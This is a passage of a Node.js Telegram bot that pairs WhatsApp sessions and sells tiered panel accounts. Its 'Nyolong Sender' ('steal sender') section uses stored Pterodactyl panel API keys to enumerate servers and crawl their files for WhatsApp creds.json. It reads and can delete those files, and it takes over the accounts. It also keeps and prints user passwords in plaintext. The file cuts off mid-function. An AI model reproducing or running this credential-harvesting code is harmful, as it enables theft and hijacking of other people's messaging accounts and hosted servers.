const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const httpMod = require('http')
const httpsMod = require('https')
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./database/userStore.js");

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
app.use(cookieParser());
const userPath = path.join(__dirname, "./database/user.json");


const USAGE_LIMIT_FILE = "./database/usageLimit.json";

function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    } else {
      return {};
    }
  } catch (e) {
    return {};
  }
}

function saveUsageLimit(data) {
  fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify(data, null, 2));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isReseller(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "reseller" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let sock;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "ATAAXWEB");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.magenta(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║       ${chalk.bgBlackBright.bold(' CURSED SYSTEM ACTIVE ')}         ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`))
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to SPARTAN Settings!*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/Xsender  → 
/cadp  → 
/adp  → 
/deladp  → 
/adplist  → 
/adduser   → Create User  
/address   → Create Reseller  
/addadmin  → Create Admin  
/addowner  → Create Owner  
/edituser  → Change User  
/extend    → Extend Expired  
/listuser  → Reveal All Active Users  
/deluser   → Remove User  
/connect   → Bind Your Bot Session  
/listsender → Trace Active Sender  
/delsender  → Purge Sender Identity

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/u_4ataa" }
        ]
      ]
    }
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});


bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Reseller tidak bisa menghapus user Admin.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("address", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menambahkan Reseller.");
  if (args.length !== 4) return ctx.reply("Format: /address Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "reseller" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Reseller berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delress", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menghapus Reseller.");
  if (args.length !== 2) return ctx.reply("Format: /delress username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "reseller") return ctx.reply(`⚠️ *${username}* bukan reseller.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Reseller *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambahkan Admin.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /addadmin Username Password Durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({
    username,
    password,
    expired,
    role: "admin",
    telegram_id: userId
  });

  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``;

  return ctx.reply(
    `✅ Admin berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus Admin.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deladmin <username>");
  }

  const username = args[1];
  let users = getUsers();
  const target = users.find(u => u.username === username && u.role === "admin");

  if (!target) {
    return ctx.reply(`❌ Admin *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users = users.filter(u => u.username !== username);
  saveUsers(users);

  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:\n\n`;
  users.forEach((user) => {
    if (!isOwnerUser && user.role === "admin") return; // Admin tidak boleh lihat owner
    text += `👤 *${user.username}*\n🔑 ${user.password}\n📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}\n🎖️ Role: ${user.role}\n\n`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});

bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa mengedit user.");
  }

  if (args.length < 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  if (!["user", "reseller", "admin", "owner"].includes(role)) {
    return ctx.reply(`⚠️ Role hanya bisa: User, Reseller, Admin.`, { parse_mode: "Markdown" });
  }

  if (role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  users[index] = {
    ...users[index],
    password,
    expired: Date.now() + parseInt(durasi) * 86400000,
    role
  };

  saveUsers(users);
  return ctx.reply(`✅ User *${username}* berhasil diperbarui.`, { parse_mode: "Markdown" });
});

bot.command("extend", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa memperpanjang masa aktif.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length !== 3) return ctx.reply("Format: /extend Username Durasi");

  const [_, username, durasi] = args;
  const days = parseInt(durasi);
  if (isNaN(days) || days <= 0) return ctx.reply("❌ Durasi harus berupa angka lebih dari 0.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin") return ctx.reply("⛔ Tidak bisa memperpanjang masa aktif untuk user role admin.");

  const now = Date.now();
  const base = users[index].expired > now ? users[index].expired : now;
  users[index].expired = base + (days * 86400000);

  saveUsers(users);
  ctx.reply(`✅ Masa aktif *${username}* berhasil diperpanjang hingga ${new Date(users[index].expired).toLocaleString("id-ID")}`, { parse_mode: "Markdown" });
});

// -------------------( Nyolong Sender FUNC )------------------------------ \\


if (typeof okBox === 'undefined') global.okBox = a=>"```"+"⸙ Kayla — Ok\n"+a.join("\n")+"```"
if (typeof errBox === 'undefined') global.errBox = a=>"```"+"⸙ Kayla — Eror\n"+a.join("\n")+"```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR = path.join(__dirname, 'adp');
const ADP_FILE = path.join(ADP_DIR, 'adp.json');

// Fungsi untuk memastikan folder dan file ADP tersedia
function ensureADPStorage() {
  if (!fs.existsSync(ADP_DIR)) {
    fs.mkdirSync(ADP_DIR, { recursive: true });
    console.log('[✓] Folder "adp/" dibuat.');
  }

  if (!fs.existsSync(ADP_FILE)) {
    fs.writeFileSync(ADP_FILE, JSON.stringify({}, null, 2));
    console.log('[✓] File "adp.json" dibuat.');
  }
}
ensureADPStorage();
function loadADP(){ try{ return JSON.parse(fs.readFileSync(ADP_FILE,'utf8')) }catch{ return {} } }
function saveADP(o){ fs.writeFileSync(ADP_FILE, JSON.stringify(o,null,2)) }
function isPtlc(t){ return typeof t==='string' && /^ptlc_/i.test(t) }
function isPtla(t){ return typeof t==='string' && /^ptla_/i.test(t) }
function asText(x){ return typeof x==='string' ? x : JSON.stringify(x) }
function baseUrl(d){ let u=String(d||'').trim(); if(!/^https?:\/\//i.test(u)) u='https://'+u; return u.replace(/\/+$/,'') }

async function httpGet(url, token){ return AX.get(url, { headers:{ Authorization:`Bearer ${token}` } }) }
async function httpPost(url, token, data){ return AX.post(url, data, { headers:{ Authorization:`Bearer ${token}`, 'Content-Type':'application/json' } }) }

async function fetchAllPages(url, token) {
  let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
      page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc){
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x=>({ id:x.attributes.identifier, name:x.attributes.name||x.attributes.identifier }))
}

async function listServersApplication(b, ptla){
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x=>{
    const at = x.attributes || {}
    return { id:at.identifier||at.uuidShort||at.uuid, name:at.name||at.identifier||at.uuidShort }
  }).filter(x=>x.id)
}

async function listServersWithFallback(b, ptlc, ptla){
  if (isPtlc(ptlc)) { try{ const s=await listServersClient(b, ptlc); if(s.length) return s }catch{} }
  if (isPtla(ptla)) { try{ const s=await listServersApplication(b, ptla); if(s.length) return s }catch{} }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir){
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath){
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath){
  const body = { root:"/", files:[ String(filePath).replace(/^\/+/,'') ] }
  if (isPtlc(ptlc)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body); if(r.status===204||r.status===200) return }catch{} }
  if (isPtla(ptla)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body); if(r.status===204||r.status===200) return }catch{} }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150){
  for (const qp of QUICK_PATHS){ try{ await readFileAny(base, ptla, ptlc, sid, qp); return [qp] }catch{} }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0
  while (q.length && depth < maxDepth && expanded < maxDirs){
    const size = q.length
    for (let i=0; i<size && expanded < maxDirs; i++){
      const dir = q.shift()
      expanded++
      let items=[]
      try{ items = await listDirAny(base, ptlc, ptla, sid, dir) }catch{}
      for (const it of items){
        const name = String(it.name || '')
        const isDir = (it.is_file===false)||(it.type==='directory')||(it.directory===true)||(it.is_directory===true)
        if (!isDir){
          if (name.toLowerCase()==='creds.json'){
            const p = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
            return [p]
          }
          continue
        }
        if (name==='.'||name==='..') continue
        const child = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
        if (!seen.has(child)){ seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0,2)
}

async function writeAndPairFromRaw(raw, chatId){
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try{
    await fs.writeFile(path.join(tmp,'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp,'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions==='function') saveActiveSessions(n)
    if (typeof connectToWhatsApp==='function') await connectToWhatsApp(n, chatId)
    return n
  } finally { await fs.remove(tmp).catch(()=>{}) }
}

function pLimit(n){
  let a=0, q=[]
  const next=()=>{ if(q.length && a<n){ a++; const {fn,rs,rj}=q.shift(); fn().then(v=>{a--;rs(v);next()}).catch(e=>{a--;rj(e);next()}) } }
  return fn=>new Promise((rs,rj)=>{ q.push({fn,rs,rj}); next() })
}
//cadp
bot.hears(/^\/cadp\s+(\S+)\s+(\S+)$/i, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply("Hanya Owner yang bisa tambah adp!");
  }

  const match = ctx.message.text.match(/^\/cadp\s+(\S+)\s+(\S+)$/i);
  if (!match) return;

  const key = match[1];
  const parts = match[2].split(",").map(s => s.trim());

  if (parts.length < 3) {
    return ctx.reply(
      errBox(["Format: /cadp <alias> <ptla,ptlc,domain>"]),
      { parse_mode: "Markdown" }
    );
  }

  const [ptla, ptlc, domain] = parts;

  const data = loadADP();
  data[key] = { ptla, ptlc, domain };
  saveADP(data);

  await ctx.reply(
    okBox([`ADP '${key}' disimpan`]),
    { parse_mode: "Markdown" }
  );
});

// /adplist command
bot.command('adplist', async (ctx) => {
  const chatId = ctx.chat.id
  const userId = ctx.from.id

  if (!isOwner(userId)) {
    return ctx.reply("Hanya Owner yang bisa melihat list adp!")
  }

  const data = loadADP()
  const mask = v => String(v || "").slice(0, 10) + (String(v || "").length > 10 ? "…" : "")
  const lines = Object.entries(data).map(([k, v]) => {
    return `${k} → ${v.domain || "-"} • ${mask(v.ptla)} • ${mask(v.ptlc)}`
  })

  await ctx.reply(
    lines.length ? okBox(lines) : errBox(["(kosong)"]),
    { parse_mode: "Markdown" }
  )
})

// /deladp <key> command
bot.hears(/^\/deladp\s+(\S+)$/i, async (ctx) => {
  const chatId = ctx.chat.id
  const userId = ctx.from.id
  const match = ctx.message.text.match(/^\/deladp\s+(\S+)$/i)
  if (!match) return

  const key = match[1]

  if (!isOwner(userId)) {
    return ctx.reply("Hanya Owner yang bisa delete adp!")
  }

  const data = loadADP()
  if (!data[key]) {
